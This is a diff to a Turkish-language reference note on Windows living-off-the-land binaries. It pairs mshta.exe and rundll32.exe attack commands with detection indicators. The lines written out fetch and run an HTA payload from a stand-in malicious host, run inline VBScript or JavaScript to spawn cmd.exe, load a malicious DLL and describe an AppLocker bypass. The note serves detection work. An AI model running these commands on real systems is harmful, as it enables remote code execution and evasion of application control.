@@ -4,8 +4,8 @@
 HTML Application (.hta) dosyalarını çalıştırır. Uzak HTA veya inline VBScript/JScript çalıştırma
 
 **Komut:**
-mshta.exe [http://zararli.com/payload.hta](http://zararli.com/payload.hta)
-mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe""")
+- mshta.exe [http://zararli.com/payload.hta](http://zararli.com/payload.hta)
+- mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe""")
 
 **IOC:** mshta.exe + URL argümanı, child olarak cmd/powershell, meşru kullanım neredeyse yok
 
@@ -16,9 +16,11 @@ mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe""")
 DLL içindeki fonksiyonları çalıştırır. Zararlı DLL çalıştırma, JavaScript inline, AppLocker bypass
 
 **Komut:**
-rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";...
-rundll32.exe zararlı.dll,EntryPoint
-rundll32.exe shell32.dll,ShellExec\_RunDLL cmd.exe
+- rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";...
+
+- rundll32.exe zararlı.dll,EntryPoint
+
+- rundll32.exe shell32.dll,ShellExec\_RunDLL cmd.exe
 
 **IOC:** javascript: veya vbscript: argümanı, URL üzerinden DLL yükleme
 
